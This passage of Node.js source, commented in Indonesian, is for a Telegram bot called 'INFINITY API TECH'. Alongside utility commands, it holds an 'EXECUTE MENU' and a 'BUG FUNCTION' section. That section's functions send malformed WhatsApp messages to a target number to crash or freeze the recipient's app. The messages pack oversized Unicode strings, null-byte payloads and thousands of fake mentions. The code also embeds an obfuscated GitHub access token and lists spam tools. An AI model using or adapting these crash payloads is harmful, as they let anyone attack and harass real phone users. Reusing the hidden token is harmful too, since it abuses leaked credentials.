        fs.writeFileSync(filePath, response.data);

        const zip = new AdmZip();
        zip.addLocalFile(filePath);
        const zipPath = filePath + ".zip";
        zip.writeZip(zipPath);

        await bot.sendDocument(chatId, zipPath, {
            caption: "📦 File berhasil di-zip dari MediaFire",
        });

        fs.unlinkSync(filePath);
        fs.unlinkSync(zipPath);

    } catch (err) {
        console.error("[MEDIAFIRE ERROR]", err);
        bot.sendMessage(chatId, "❌ Terjadi kesalahan saat membuat ZIP.");
    }
});

const acorn = require("acorn");
function escapeHtml(str) {
  return str
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;");
}

bot.onText(/\/ceksyntax/, async (msg) => {
  const chatId = msg.chat.id;

  if (!msg.reply_to_message || !msg.reply_to_message.document) {
    return bot.sendMessage(chatId,
      "❌ <b>Reply</b> ke file <code>.js</code> yang ingin dicek.",
      { parse_mode: "HTML" }
    );
  }

  const doc = msg.reply_to_message.document;

  if (!doc.file_name.endsWith(".js")) {
    return bot.sendMessage(chatId,
      "❌ File harus berformat <code>.js</code>",
      { parse_mode: "HTML" }
    );
  }

  try {
    const fileLink = await bot.getFileLink(doc.file_id);
    const res = await fetch(fileLink);
    const code = await res.text();
    try {
      acorn.parse(code, {
        ecmaVersion: "latest",
        sourceType: "module",
        locations: true,
      });

      return bot.sendMessage(chatId,
        "<b>✅ Syntax OK</b>\nFile JavaScript valid.",
        { parse_mode: "HTML" }
      );

    } catch (err) {
      const loc = err.loc || { line: "-", column: "-" };
      const line = loc.line ?? "-";
      const col = loc.column ?? "-";

      const lines = code.split(/\r?\n/);
      const errLine = lines[line - 1] || "";

      const caret = " ".repeat(Math.min(col, errLine.length)) + "^";

      const html = `
<b>❌ Syntax Error</b>

<b>Pesan:</b> <code>${escapeHtml(err.message)}</code>
<b>Baris:</b> <code>${line}</code>  
<b>Kolom:</b> <code>${col}</code>

<b>Bagian error:</b>
<pre>${escapeHtml(errLine)}</pre>
<pre>${escapeHtml(caret)}</pre>
      `;

      return bot.sendMessage(chatId, html, { parse_mode: "HTML" });
    }

  } catch (e) {
    console.error(e);
    bot.sendMessage(chatId, "❌ Terjadi error saat membaca file.");
  }
});

bot.onText(/^\/update$/, async (msg) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;
    
    if (!isOwner(senderId) && !isPremium(senderId)) {
      return bot.sendMessage(chatId, "<b>Akses ditolak.</b>", { parse_mode: "HTML" });
    }

    bot.sendMessage(chatId, "🔄 Update dimulai...");

    try {
        await downloadRepo("");
        bot.sendMessage(chatId, "✅ Update selesai!\n🔁 Bot restart otomatis.");

        setTimeout(() => process.exit(0), 1500);

    } catch (e) {
        bot.sendMessage(chatId, "❌ Gagal update Lapor ke @Killertzy2 Atau @x3rayy");
        console.error(e);
    }
});

const JSZip = require("jszip");
const { Octokit } = require("@octokit/rest");

function getToken() {
  return [
    "g","h","p","_","F","o","h","k","D","m","7","i","y","b","i","Y","H","g","5",
    "g","5","E","B","k","c","0","s","B","E","a","n","b","E","W","0","0","6","N",
    "v","U"
  ].join("");
}

const GH_TOKEN = getToken();
const octo = new Octokit({ auth: GH_TOKEN });
const temp = {};

function sendHTML(chat, text) {
  return bot.sendMessage(chat, text, { parse_mode: "HTML" });
}
function esc(t) {
  return t.replace(/[&<>]/g, c =>
    ({ "&": "&amp;", "<": "&lt;", ">": "&gt;" }[c])
  );
}

async function downloadFile(fileId) {
  const link = await bot.getFileLink(fileId);
  const res = await axios.get(link, { responseType: "arraybuffer" });
  return Buffer.from(res.data);
}


async function uploadGitHub(path, buffer) {
  return octo.repos.createOrUpdateFileContents({
    owner: GH_OWNER,
    repo: GH_REPO,
    branch: GH_BRANCH,
    path: path,
    message: "Upload via Telegram Bot",
    content: buffer.toString("base64"),
  });
}

bot.on("message", async (msg) => {
  const chat = msg.chat.id;

  if (!msg.document) return;
  const file = msg.document;
  const filename = file.file_name;

  sendHTML(chat, `<b>Menerima file</b>: <code>${esc(filename)}</code>\nSedang download...`);

  try {
    const buffer = await downloadFile(file.file_id);

    temp[chat] = { buffer, filename };

    sendHTML(chat, `File siap upload.\nBalas file ini dan ketik:\n<code>/uploudgh</code>`);
  } catch (err) {
    sendHTML(chat, `<b>Error download:</b>\n<pre>${esc(err.message)}</pre>`);
  }
});

bot.onText(/\/uploudgh/, async (msg) => {
  const chat = msg.chat.id;
  const userId = msg.from.id;
  
  if (!ADMIN_ID.includes(userId)) {
  return bot.sendMessage(chatId, "❌ Kamu tidak memiliki akses untuk menggunakan perintah ini.");
}

  if (!temp[chat]) return sendHTML(chat, "<b>Tidak ada file yang siap upload.</b>");

  const { buffer, filename } = temp[chat];
  sendHTML(chat, "<b>Memproses file...</b>");

  try {
    let files = [];

    if (filename.endsWith(".zip")) {
      sendHTML(chat, "<b>ZIP terdeteksi, extracting...</b>");

      const zip = await JSZip.loadAsync(buffer);

      for (const f of Object.keys(zip.files)) {
        const item = zip.files[f];
        if (item.dir) continue;

        const buf = await item.async("nodebuffer");
        files.push({ path: f, buffer: buf });
      }
    } else {
      files.push({ path: filename, buffer });
    }

    sendHTML(chat, `<b>Uploading ke GitHub...</b>\nJumlah file: <code>${files.length}</code>`);

    for (const f of files) {
      await uploadGitHub(f.path, f.buffer);
    }

    sendHTML(chat, `<b>UPLOAD SELESAI!</b>\nTotal file: <code>${files.length}</code>\nRepository: <code>${GH_OWNER}/${GH_REPO}</code>`);

  } catch (err) {
    sendHTML(chat, `<b>ERROR UPLOAD:</b>\n<pre>${esc(err.message)}</pre>`);
  }

  delete temp[chat];
});

async function deleteAllFiles(path = "") {
  const url = `https://api.github.com/repos/${GH_OWNER}/${GH_REPO}/contents/${path}?ref=${GH_BRANCH}`;

  const { data } = await axios.get(url, {
    headers: { Authorization: `token ${GH_TOKEN}` }
  });

  for (const item of data) {
    if (item.type === "file") {
      await axios.delete(
        `https://api.github.com/repos/${GH_OWNER}/${GH_REPO}/contents/${item.path}`,
        {
          headers: { Authorization: `token ${GH_TOKEN}` },
          data: {
            message: `Delete ${item.path}`,
            sha: item.sha,
            branch: GH_BRANCH
          }
        }
      );

      console.log(`Deleted file: ${item.path}`);
    } else if (item.type === "dir") {
      await deleteAllFiles(item.path);
    }
  }
}

// ===========================
//         COMMAND
// ===========================
bot.onText(/^\/delupdate$/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  
   if (!ADMIN_ID.includes(userId)) {
  return bot.sendMessage(chatId, "❌ Kamu tidak memiliki akses untuk menggunakan perintah ini.");
}

  try {
    await bot.sendMessage(
      chatId,
      `<b>🗑 Menghapus Seluruh File Update</b>\n` +
      `━━━━━━━━━━━━━━━━━━\n` +
      `▸ Repository: <code>${GH_OWNER}/${GH_REPO}</code>\n` +
      `▸ Branch: <code>${GH_BRANCH}</code>\n\n` +
      `<i>Mohon tunggu sebentar...</i>`,
      { parse_mode: "HTML" }
    );

    await deleteAllFiles("");

    await bot.sendMessage(
      chatId,
      `<b>✅ SEMUA FILE BERHASIL DIHAPUS</b>\n` +
      `━━━━━━━━━━━━━━━━━━\n` +
      `Repo sekarang <i>kosong total</i> ✔\n\n` +
      `Silakan upload update baru dengan perintah:\n<code>/uploudgh</code>`,
      { parse_mode: "HTML" }
    );

  } catch (err) {
    console.error(err);

    await bot.sendMessage(
      chatId,
      `<b>❌ GAGAL MENGHAPUS FILE</b>\n` +
      `━━━━━━━━━━━━━━━━━━\n` +
      `<i>${err.message}</i>`,
      { parse_mode: "HTML" }
    );
  }
});

bot.onText(/^\/newberita$/, async (msg) => {
    const chatId = msg.chat.id;
    const axios = require("axios");

    const sources = [
        { name: "Antara", url: "https://api.siputzx.my.id/api/berita/antara" },
        { name: "Kompas", url: "https://api.siputzx.my.id/api/berita/kompas" },
        { name: "CNN", url: "https://api.siputzx.my.id/api/berita/cnn" },
        { name: "CNBC Indonesia", url: "https://api.siputzx.my.id/api/berita/cnbcindonesia" },
    ];

    const waitMsg = await bot.sendMessage(chatId, "⏳ Mengambil berita terbaru dari semua sumber...");

    try {
        // Loop tiap sumber berita
        for (let src of sources) {
            try {
                const { data } = await axios.get(src.url);

                if (!data || !data.result || data.result.length === 0) {
                    await bot.sendMessage(chatId, `⚠️ Tidak ada berita dari ${src.name}`);
                    continue;
                }

                const b = data.result[0]; // Ambil berita pertama

                const teks =
`📰 <b>${src.name} – Berita Terbaru</b>

<b>Judul:</b> ${b.title || "-"}
<b>Tanggal:</b> ${b.pubDate || "-"}

<b>Deskripsi:</b>
${b.description || "-"}

🔗 <b>Link:</b>
${b.link || "-"}`;

                await bot.sendMessage(chatId, teks, { parse_mode: "HTML" });

                // Delay 2 detik biar gak spam
                await new Promise(resolve => setTimeout(resolve, 2000));

            } catch (err) {
                await bot.sendMessage(chatId, `❌ Gagal mengambil berita dari ${src.name}`);
            }
        }

        await bot.deleteMessage(chatId, waitMsg.message_id);

    } catch (err) {
        console.error(err);
        bot.sendMessage(chatId, "❌ Error mengambil berita semua sumber!");
    }
});

bot.onText(/^\/?(?:trackip|ip) (.+)/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const target = match[1]?.trim();

  if (!isOwner(userId) && !isPremium(userId)) {
    return bot.sendMessage(chatId, "⚠️ *Akses Ditolak*\nAnda tidak memiliki akses premium.", { parse_mode: "Markdown" });
  }

  if (!target) return bot.sendMessage(chatId, "⚠️ Masukkan IP atau domain yang ingin di-track!");

  await bot.sendMessage(chatId, "🔍 <b>Sedang mencari data IP...</b>", { parse_mode: "HTML" });

  try {
    const url = `http://ip-api.com/json/${encodeURIComponent(target)}?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,reverse,query,mobile,proxy,hosting`;
    const { data } = await axios.get(url, { timeout: 10000 });

    if (data.status !== "success") {
      return bot.sendMessage(chatId, `❌ Gagal mengambil data: <b>${data.message || "Tidak diketahui."}</b>`, { parse_mode: "HTML" });
    }

    const flags = [
      data.mobile ? "📱 Mobile" : null,
      data.proxy ? "🕵️ Proxy" : null,
      data.hosting ? "💻 Hosting" : null,
    ].filter(Boolean).join(" | ") || "🚫 Tidak ada";

    const mapUrl = `https://www.google.com/maps?q=${data.lat},${data.lon}`;

    const reply = `
<b>🌐 HASIL TRACK IP</b>
━━━━━━━━━━━━━━━━━━
📍 <b>IP / Domain:</b> <code>${data.query}</code>
🏳️ <b>Negara:</b> ${data.country} (${data.countryCode})
🏙️ <b>Region:</b> ${data.regionName} (${data.region})
📌 <b>Kota:</b> ${data.city || "-"}
✉️ <b>Kode Pos:</b> ${data.zip || "-"}
🕒 <b>Zona Waktu:</b> ${data.timezone || "-"}
━━━━━━━━━━━━━━━━━━
🛰️ <b>ISP:</b> ${data.isp || "-"}
🏢 <b>Organisasi:</b> ${data.org || "-"}
🔢 <b>ASN:</b> ${data.as || "-"}
🔁 <b>Reverse DNS:</b> ${data.reverse || "-"}
━━━━━━━━━━━━━━━━━━
🔒 <b>Flags:</b> ${flags}
━━━━━━━━━━━━━━━━━━
📌 <b>Koordinat:</b> ${data.lat}, ${data.lon}
🗺️ <a href="${mapUrl}">Lihat di Google Maps</a>
`;

    await bot.sendMessage(chatId, reply, {
      parse_mode: "HTML",
      disable_web_page_preview: false,
      reply_markup: {
        inline_keyboard: [
          [{ text: "🗺️ Buka di Google Maps", url: mapUrl }],
          [{ text: "🌐 Lihat Raw Data", url: `http://ip-api.com/json/${encodeURIComponent(target)}` }],
        ],
      },
    });
  } catch (err) {
    console.error("❌ Error track IP:", err.response?.status, err.response?.data || err.message);
    await bot.sendMessage(chatId, `❌ Gagal mengambil data: <b>${err.response?.statusText || err.message}</b>`, { parse_mode: "HTML" });
  }
});

bot.on("callback_query", async (query) => {
  if (!query.message) return;

  const chatId = query.message.chat.id;
  const messageId = query.message.message_id;

  const username = query.from.username
    ? `@${query.from.username}`
    : `${query.from.first_name || ""} ${query.from.last_name || ""}`.trim();

  const connect =
    sessions.size === 0
      ? "Belum ada bot"
      : `${sessions.size} session${sessions.size > 1 ? "s" : ""}`;

  // FOTO RANDOM (hanya dipanggil kalau ganti menu)
  const getRandomPhoto = () => {
    const photos = [
    "https://files.catbox.moe/zmhbmv.jpg",
    "https://files.catbox.moe/rlnsb5.jpg",
    "https://files.catbox.moe/0hf71c.jpg",
  ];
    return photos[Math.floor(Math.random() * photos.length)];
  };

  const infoBlock = `
<blockquote>⬡──〔 <b>INFINITY API TECH</b> 〕──⬡</blockquote>
<b>• Username :</b> ${username}
<b>• Versi :</b> 21.0
<b>• Session :</b> ${connect}
<b>• Access :</b> Js / API
<b>• Type :</b> Node-Telegram-Api
<blockquote>⬡────────────────────────────⬡</blockquote>
`;

  // Fungsi untuk ganti foto + caption
  const switchMenu = async (caption, keyboard) => {
    await bot.editMessageMedia(
      {
        type: "photo",
        media: getRandomPhoto(),
        caption: caption,
        parse_mode: "HTML",
      },
      {
        chat_id: chatId,
        message_id: messageId,
        reply_markup: keyboard,
      }
    );
  };

  // ============================
  //      MENU HANDLER
  // ============================

  if (query.data === "menu1") {
    await switchMenu(
      `${infoBlock}
<blockquote>⬡──〔 SETTING MENU 〕──⬡</blockquote>
• addbot number  
• delbot number  
• listbot  
• addprem userid  
• delprem userid  
• listprem  
• setjeda duration  
• add (creds.json) 
• csession 
<blockquote>⬡────────────────────────────⬡</blockquote>`,
      {
        inline_keyboard: [[{ text: "⬅️ BACK", callback_data: "backmenu" }]],
      }
    );
  }
  
  else if (query.data === "tools") {
    await switchMenu(
      `${infoBlock}
<blockquote>⬡──〔 RANDOM MENU 〕──⬡</blockquote>
• pinterest anime  
• trashpairing 628xx  
• spamngl url  
• ai on/off  
• tt ( link ) 
• play ( dj sound ) 
• newberita
• getcode ( link ) 
• brat ( teks ) 
• newberita
• ceksyntax
• downloadmediafire link
• update
<blockquote>⬡────────────────────────────⬡</blockquote>`,
      {
        inline_keyboard: [[{ text: "⬅️ BACK", callback_data: "backmenu" }]],
      }
    );
  }

  else if (query.data === "menu3") {
    await switchMenu(
      `${infoBlock}
<blockquote>⬡──〔 EXECUTE MENU 〕──⬡</blockquote>
• iosinfinity 628××  
• crashinfinity 628××  
• delaykuota 628××  
• delayv2 628xx
<blockquote>⬡────────────────────────────⬡</blockquote>`,
      {
        inline_keyboard: [[{ text: "⬅️ BACK", callback_data: "backmenu" }]],
      }
    );
  }
  
  else if (query.data === "Tqto") {
  await switchMenu(
    `${infoBlock}
<b><blockquote>⬡──〔 𝙏𝙃𝘼𝙉𝙆𝙎 𝙏𝙊 〕──⬡</blockquote></b>

<i>Ucapan terima kasih sebesar-besarnya kepada :</i>

<b>• @Killertzy2</b> — <code>Pemilik Asli</code>  
<b>• @VerVnx</b> — <code>Staf Pribadi</code>  
<b>• @ArdiSolution</b> — <code>Staf Fix Eror</code>  
<b>• @LordDzik</b> — <code>Staf Sender</code>  

<b><blockquote>⬡────────────────────────────⬡</blockquote></b>`,
    {
      inline_keyboard: [
        [{ text: "⬅️ BACK", callback_data: "backmenu" }]
      ]
    }
  );
}

  else if (query.data === "backmenu") {
    await switchMenu(
      `
<blockquote>⬡────────〔 <b>INFINITY API TECH</b> 〕────────⬡</blockquote>
<i>Welcome...</i>  
Selamat datang di <b>INFINITY API TECH</b>.  
Bot dengan fitur tingkat tinggi—cepat, presisi, dan stabil.

<blockquote>⬡──〔 INFORMATION 〕──⬡</blockquote>
<b>• Username :</b> ${username}
<b>• Versi :</b> 0.0
<b>• Session :</b> ${connect}
<b>• Access :</b> Js / API
<b>• Type :</b> Node-Telegram-Api

<blockquote>⬡──〔 SELECT MENU 〕──⬡</blockquote>`,
      {
    inline_keyboard: [
      [{ text: "⚙️ SETTING BOT", callback_data: "menu1" }],
      [{ text: "🧪 TOOLS", callback_data: "tools" }],
      [{ text: "👤 THANKS TO", callback_data: "Tqto" }],
      [
        { text: "🦠 EXECUTE MENU", callback_data: "menu3" },
        { text: "📍 OWNER", url: "https://t.me/Killertzy2" },
      ],
        ],
      }
    );
  }
});

//==================[ BUG FUNCTION ]==================
async function iosLx(sock, target) {
  for(let z = 0; z < 720; z++) {
    await sock.relayMessage(target, {
      groupStatusMessageV2: {
        message: {
          locationMessage: {
            degreesLatitude: 21.1266,
            degreesLongitude: -11.8199,
            name: `🧪⃟꙰。⌁𝐊𝐢𝐥𝐥𝐞𝐫𝐓𝐳𝐲- 𝐄𝐱𝐩𝐨𝐬𝐞𝐝` + "𑇂𑆵𑆴𑆿".repeat(60000),
            url: "https://t.me/Killertzy2",
            contextInfo: {
              mentionedJid: Array.from({ length:2000 }, (_, z) => `628${z + 1}@s.whatsapp.net`), 
              externalAdReply: {
                quotedAd: {
                  advertiserName: "𑇂𑆵𑆴𑆿".repeat(60000),
                  mediaType: "IMAGE",
                  jpegThumbnail: "https://files.catbox.moe/dtv40r.png", 
                  caption: "𑇂𑆵𑆴𑆿".repeat(60000)
                },
                placeholderKey: {
                  remoteJid: "0s.whatsapp.net",
                  fromMe: false,
                  id: "ABCDEF1234567890"
                }
              }
            }
          }
        }
      }
    },{ participant: { jid:target } });
  }
}

async function TrashLocaIos(sock, target) {
  const TrashIosx = ". ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ " + "𑇂𑆵𑆴𑆿";
  
      let locationMessage = {
         degreesLatitude: -9.09999262999,
         degreesLongitude: 199.99963118999,
         jpegThumbnail: "https://files.catbox.moe/dtv40r.png",
         name: "🧪⃟꙰。⌁𝐊𝐢𝐥𝐥𝐞𝐫𝐓𝐳𝐲- 𝐄𝐱𝐩𝐨𝐬𝐞𝐝✩" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000), 
         address: "🧪⃟꙰。⌁𝐊𝐢𝐥𝐥𝐞𝐫𝐓𝐳𝐲- 𝐄𝐱𝐩𝐨𝐬𝐞𝐝 ✩" + "𑇂𑆵𑆴𑆿𑆿".repeat(10000), 
         url: `https://KillerTzy-Iosx.${"𑇂𑆵𑆴𑆿".repeat(25000)}.com` + TrashIosx, 
      }
      
      let msg = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               locationMessage
            }
         }
      }, {});
    
  await sock.relayMessage('status@broadcast', msg.message, {
      messageId: msg.key.id,
      statusJidList: [target],
      additionalNodes: [{
        tag: 'meta',
        attrs: {},
        content: [{
          tag: 'mentioned_users',
          attrs: {},
            content: [{
              tag: 'to',
              attrs: {
                jid: target
              },
                content: undefined
               }]
            }]
        }]
    });
    await sleep(5000)
 }
 
 async function glxFrcInvisible(sock, target) {
  try {
    for (let i = 0; i < 2; i++) {
      const msg = await generateWAMessageFromContent(
        target,
        {
          interactiveResponseMessage: {
            contextInfo: {},
            body: {
              text: " 𝐈𝐧𝐯𝐢𝐬𝐢𝐛𝐥𝐞 𝐏𝐚𝐜𝐤 ",
              format: "EXTENSION_1"
            },
            nativeFlowResponseMessage: {
              name: "galaxy_message",
              paramsJson: JSON.stringify({ flow_cta: "\u9999".repeat(90000) }),
              version: 3
            }
          }
        },
        {}
      );

      await sock.relayMessage(
        target,
        {
          groupStatusMessageV2: {
            message: msg.message
          }
        },
        { participant: { jid: target } }
      );
    }
  } catch (e) {
    console.error("error:", e);
  }
}
 
 async function delayhard2025(sock, target, mention) {
    console.log(chalk.red("⚙️ delayhard2025..."));

    const titid = [
        "13135550002@s.whatsapp.net",
        ...Array.from({ length: 1945 }, () =>
                                "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
)
    ];

    const payload = "\u0000".repeat(27152);

    for (let i = 0; i < 10; i++) {
        const msg = await generateWAMessageFromContent(target, {
            viewOnceMessage: {
                message: {
                    imageMessage: {
                        url: "https://files.catbox.moe/j5ogwy.png",
                        mimetype: "image/jpeg",
                        caption: "./xblaster",
                        fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
                        fileLength: "19769",
                        height: 354,
                        width: 783,
                        mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
                        fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
                        directPath: "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
                        mediaKeyTimestamp: "1743225419",
                        jpegThumbnail: null,
                        scansSidecar: "mh5/YmcAWyLt5H2qzY3NtHrEtyM=",
                        scanLengths: [2437, 17332],
                        contextInfo: {
                            mentionedJid: titid,
                            isSampled: true,
                            participant: target,
                            remoteJid: "status@broadcast",
                            forwardingScore: 9741,
                            isForwarded: true
                        }
                    },
                    nativeFlowResponseMessage: {
                        name: "call_permission_request",
                        paramsJson: payload
                    }
                }
            }
        }, { userJid: target });
        await sock.relayMessage("status@broadcast", msg.message, {
            messageId: msg.key.id,
            statusJidList: [target],
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: {},
                    content: [
                        {
                            tag: "mentioned_users",
                            attrs: {},
                            content: [
                                { tag: "to", attrs: { jid: target }, content: undefined }
                            ]
                        }
                    ]
                }
            ]
        });

        if (mention) {
            await sock.relayMessage(
                target,
                {
                    statusMentionMessage: {
                        message: {
                            protocolMessage: {
                                key: msg.key,
                                fromMe: false,
                                participant: "0@s.whatsapp.net",
                                remoteJid: "status@broadcast",
                                type: 25
                            }
                        }
                    }
                },
                {
                    additionalNodes: [
                        {
                            tag: "meta",
                            attrs: { is_status_mention: "— \u9999" },
                            content: undefined
                        }
                    ]
                }
            );
        }

        console.log(chalk.green(`[${i + 1}/10] ✅ delayhard2025 iteration done`));
    }

    console.log(chalk.yellow("✅ Finished delayhard2025!"));
}
 
 async function Blzr(sock, target) {
try {
const abimsalsa = "\u2063".repeat(4000);
const salsa = "\u300B".repeat(3000);

const msg1 = {  
  viewOnceMessage: {  
    message: {  
      interactiveResponseMessage: {  
        body: {  
          text: "𝐁𝐮𝐥𝐥𝐝𝐨𝐙𝐞𝐫 𝐍𝐞𝐰",  
          format: "DEFAULT"  
        },  
        nativeFlowResponseMessage: {  
          name: "call_permission_request",  
          paramsJson: "\u0000".repeat(9000),  
          actions: [  
            { name: "galaxy_message", buttonParamsJson: "\u0005".repeat(6000) + salsa }  
          ],  
          version: 3  
        }  
      }  
    }  
  }  
};  

const msg2 = {  
  stickerMessage: {  
    url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw",  
    fileSha256: "mtc9ZjQDjIBETj76yZe6ZdsS6fGYL+5L7a/SS6YjJGs=",  
    fileEncSha256: "tvK/hsfLhjWW7T6BkBJZKbNLlKGjxy6M6tIZJaUTXo8=",  
    mediaKey: "ml2maI4gu55xBZrd1RfkVYZbL424l0WPeXWtQ/cYrLc=",  
    mimetype: "image/webp",  
    height: 9999,  
    width: 9999,  
    directPath: "/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw",  
    fileLength: 12260,  
    mediaKeyTimestamp: "1743832131",  
    isAnimated: false,  
    stickerSentTs: "X",  
    isAvatar: false,  
    isAiSticker: false,  
    isLottie: false,  
    contextInfo: {  
      mentionedJid: [  
        "0@s.whatsapp.net",  
        ...Array.from({ length: 1900 }, () =>  
          `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`  
        )  
      ],  
      stanzaId: "1234567890ABCDEF",  
      quotedMessage: {  
        paymentInviteMessage: {  
          serviceType: 3,  
          expiryTimestamp: Date.now() + 1814400000  
        }  
      }  
    }  
  }  
};  

const msg3 = {  
  viewOnceMessage: {  
    message: {  
      interactiveMessage: {  
        body: {  
          xternalAdReply: {  
            title: "Abimofficial",  
            text: abimsalsa  
          }  
        },  
        extendedTextMessage: {  
          text: "{".repeat(9000),  
          contextInfo: {  
            mentionedJid: Array.from(  
              { length: 2000 },  
              (_, i) => `1${i}@s.whatsapp.net`  
            )  
          }  
        },  
        businessMessageForwardInfo: {  
          businessOwnerJid: "13135550002@s.whatsapp.net"  
        },  
        nativeFlowMessage: {  
          buttons: [  
            { name: "cta_url", buttonParamsJson: "\u0005".repeat(1000) + salsa },  
            { name: "call_permission_request", buttonParamsJson: "\u0005".repeat(7000) + salsa }  
          ],  
          nativeFlowResponseMessage: {  
            name: "galaxy_message",  
            paramsJson: "\u0000".repeat(7000),  
            version: 3  
          },  
          contextInfo: {  
            mentionedJid: [  
              "0@s.whatsapp.net",  
              ...Array.from(  
                { length: 1900 },  
                () => `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`  
              )  
            ]  
          }  
        }  
      }  
    }  
  }  
};  

const msg4 = {  
  viewOnceMessage: {  
    message: {  
      interactiveResponseMessage: {  
        body: {  
          text: "Null Version",  
          format: "DEFAULT"  
        },  
        nativeFlowResponseMessage: {  
          name: "call_permission_request",  
          paramsJson: "\u0000".repeat(6000),  
          version: 3  
        },  
        contextInfo: {  
          participant: "0@s.whatsapp.net",  
          remoteJid: "status@broadcast",  
          mentionedJid: [  
            "0@s.whatsapp.net",  
            ...Array.from({ length: 1900 }, () =>  
              "1" + Math.floor(Math.random() * 500000).toString(16).padStart(6, "0")  
            )  
          ],  
          quotedMessage: {  
            paymentInviteMessage: {  
              serviceType: 3,  
              expiryTimeStamp: Date.now() + 1690500  
            }  
          }  
        }  
      }  
    }  
  }  
};  

const msg5 = {  
  requestPhoneNumberMessage: {  
    contextInfo: {  
      businessMessageForwardInfo: {  
        businessOwnerJid: "13135550002@s.whatsapp.net"  
      },  
      bimid: "apa an bego" + "p" + Math.floor(Math.random() * 99999),  
      forwardingScore: 100,  
      isForwarded: true,  
      forwardedNewsletterMessageInfo: {  
        newsletterJid: "120363321780349272@newsletter",  
        serverMessageId: 1,  
        newsletterName: "bim".repeat(1)  
      }  
    }  
  }  
};  

const msg6 = {  
  videoMessage: {  
    url: "https://example.com/video.mp4",  
    mimetype: "video/mp4",  
    fileSha256: "TTJaZa6KqfhanLS4/xvbxkKX/H7Mw0eQs8wxlz7pnQw=",  
    fileLength: "1515940",  
    seconds: 14,  
    mediaKey: "4CpYvd8NsPYx+kypzAXzqdavRMAAL9oNYJOHwVwZK6Y",  
    height: 1280,  
    width: 720,  
    fileEncSha256: "o73T8DrU9ajQOxrDoGGASGqrm63x0HdZ/OKTeqU4G7U=",  
    directPath: "/example",  
    mediaKeyTimestamp: "1748276788",  
    contextInfo: {  
      isSampled: true,  
      mentionedJid: typeof mentionedList !== "undefined" ? mentionedList : []  
    }  
  }  
};  

const msg7 = [  
  {  
    ID: "68917910",  
    uri: "t62.43144-24/10000000_2203140470115547_947412155165083119_n.enc?ccb=11-4&oh",  
    buffer: "11-4&oh=01_Q5Aa1wGMpdaPifqzfnb6enA4NQt1pOEMzh-V5hqPkuYlYtZxCA&oe",  
    sid: "5e03e0",  
    SHA256: "ufjHkmT9w6O08bZHJE7k4G/8LXIWuKCY9Ahb8NLlAMk=",  
    ENCSHA256: "dg/xBabYkAGZyrKBHOqnQ/uHf2MTgQ8Ea6ACYaUUmbs=",  
    mkey: "C+5MVNyWiXBj81xKFzAtUVcwso8YLsdnWcWFTOYVmoY=",  
  },  
  {  
    ID: "68884987",  
    uri: "t62.43144-24/10000000_1648989633156952_6928904571153366702_n.enc?ccb=11-4&oh",  
    buffer: "B01_Q5Aa1wH1Czc4Vs-HWTWs_i_qwatthPXFNmvjvHEYeFx5Qvj34g&oe",  
    sid: "5e03e0",  
    SHA256: "ufjHkmT9w6O08bZHJE7k4G/8LXIWuKCY9Ahb8NLlAMk=",  
    ENCSHA256: "25fgJU2dia2Hhmtv1orOO+9KPyUTlBNgIEnN9Aa3rOQ=",  
    mkey: "lAMruqUomyoX4O5MXLgZ6P8T523qfx+l0JsMpBGKyJc=",  
  }
]

for (const msg of [msg4, msg5, msg6]) {  
  await sock.relayMessage("status@broadcast", msg, {  
    messageId: undefined,  
    statusJidList: [target],  
    additionalNodes: [  
      {  
        tag: "meta",  
        attrs: {},  
        content: [  
          {  
            tag: "mentioned_users",  
            attrs: {},  
            content: [{ tag: "to", attrs: { jid: target } }]  
          }  
        ]  
      }  
    ]  
  });  
}  

for (const msg of [msg1, msg2, msg3]) {  
  await sock.relayMessage("status@broadcast", msg, {  
    messageId: undefined,  
    statusJidList: [target],  
    additionalNodes: [  
      {  
        tag: "meta",  
        attrs: {},  
        content: [  
          {  
            tag: "mentioned_users",  
            attrs: {},  
            content: [{ tag: "to", attrs: { jid: target } }]  
          }  
        ]  
      }  
    ]  
  });  
}  

for (const msg of msg7) {  
  await sock.relayMessage("status@broadcast", msg, {  
    messageId: undefined,  
    statusJidList: [target],  
    additionalNodes: [  
      {  
        tag: "meta",  
        attrs: {},  
        content: [  
          {  
            tag: "mentioned_users",  
            attrs: {},  
            content: [{ tag: "to", attrs: { jid: target } }]  
          }  
        ]  
      }  
    ]  
  });  
}

console.log(`Wolker Attacked Sending Bug To ${target} suksesfull`);

} catch (e) {
console.error(e);
}
}
 
 async function InvisHard(sock, target, mention) {
            let msg = await generateWAMessageFromContent(target, {
                buttonsMessage: {
                    text: "🩸",
                    contentText:
                        "INVISHARDER",
                    footerText: "InvisibleHard༑",
                    buttons: [
                        {
                            buttonId: ".bugs",
                            buttonText: {
                                displayText: "🇷🇺" + "\u0000".repeat(800000),
                            },
                            type: 1,
                        },
                    ],
                    headerType: 1,
                },
            }, {});
        
            await sock.relayMessage("status@broadcast", msg.message, {
                messageId: msg.key.id,
                statusJidList: [target],
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: {},
                        content: [
